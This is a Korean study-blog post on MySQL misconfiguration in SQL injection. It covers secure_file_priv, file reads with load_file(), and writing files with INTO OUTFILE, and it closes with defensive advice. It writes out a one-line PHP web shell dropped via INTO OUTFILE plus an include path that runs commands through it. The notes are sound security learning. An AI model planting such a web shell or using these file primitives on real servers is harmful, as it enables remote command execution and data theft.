---
title: "[2025-07-17] DBMS Misconfiguration"
excerpt: "DBMS Misconfiguration 개념 정리 및 우회 방법"

categories:
  - Justice
tags:
  - [SQL Injection]

permalink: /Justice/[2025-07-17] DBMS Misconfiguration/

toc: true
toc_sticky: true

date: 2025-07-17
last_modified_at: 2025-07-17
---

## 🦥 본문

### 정의

DB 서버가 보안 원칙에 맞게 구성되지 않아 발생하는 취약점

### Out of DBMS: MySQL

MySQL에서 파일 관련된 작업은 my.cnf 설정 파일의 `secure_file_priv` 값에 영향을 받음

- my.cnf
    
    ```sql
    [mysqld]
    # secure_file_priv = ""   # 미설정. 기본 설정 값으로 설정됩니다.
    secure_file_priv = "/tmp" # 해당 디렉터리 하위 경로에만 접근 가능합니다.
    secure_file_priv = ""     # mysql의 권한이 가능한 모든 경로에 접근이 가능합니다.
    secure_file_priv = NULL   # 기능이 비활성화 됩니다.
    
    mysql> select @@secure_file_priv;
    +-----------------------+
    | @@secure_file_priv    |
    +-----------------------+
    | /var/lib/mysql-files/ |
    +-----------------------+
    ```
    
    - `secure_file_priv` 값은 대체로 `/var/lib/mysql-files/`
- load_file() : 파일 읽고 출력. `secure_file_priv` 가 설정돼야 함. 파일은 전체 경로로 입력해야 하고 접근 권한이 있어야 함.
    
    ```sql
    # echo test1234 > /var/lib/mysql-files/test
    mysql> select load_file('/var/lib/mysql-files/test');
    +----------------------------------------+
    | load_file('/var/lib/mysql-files/test') |
    +----------------------------------------+
    | test1234                               |
    +----------------------------------------+
    ```
    
- into outfile : SELECT INTO 형식을 이용하여 파일이나 웹쉘 작성 가능
    - 웹쉘 삽입 뿐만 아니라 로그 유출, 백업 추출 등에도 악용
    
    ```sql
    SELECT ... INTO var_list             # column 값을 변수에 저장
    SELECT ... INTO OUTFILE  'filename'  # 쿼리 결과의 rows 값을 파일에 저장
    SELECT ... INTO DUMPFILE 'filename'  # 쿼리 결과(single row)를 파일에 저장
    
    mysql> select '<?=`$_GET[0]`?>' into outfile '/tmp/a.php';
    /* <?php include $_GET['page'].'.php'; // "?page=../../../tmp/a?0=ls" */
    ```
    
    - 위의 코드는 웹 쉘 코드 `<?=`$_GET[0]`?>` 를 백틱(`)으로 감싸 OS 명령어로 실행한다. /tmp/a.php 라는 파일로 서버에 저장하는 공격
    - `/tmp/a.php?0=ls` 를 사용하면 ls 명령어를 실행해서 결과를 출력

### 주의 사항

- 권한 문제 주의 사항 : DBMS를 작동할 때에는 DBMS 전용 계정 (nologin)을 만들어서 사용해야 한다. 루트 계정이나 다른 애플리케이션 권한이 탈취되면 큰 문제가 발생.
    - DBMS 내부에도 계정과 권한을 분리해야 한다. 여러 서비스에서 같은 DBMS를 접속할 때, 한 서비스에서 SQLi가발생하면 DBMS 계정으로 타 데이터 베이스에 접근 가능 하기 때문이다.
- 문자열 비교 주의 사항 : 웹 어플리케이션과 DBMS에서 문자열 비교 방식이 다르기 때문에 우회 가능할 수 있다.
    - 대소 문자 구분 우회
    - 공백 문자 탐지 우회
- 다중 쿼리 주의 사항 : PHP Data Objects(PDO)의 query 함수는 다중 쿼리를 지원하지 않고 exec 함수는 다중 쿼리를 실행한다.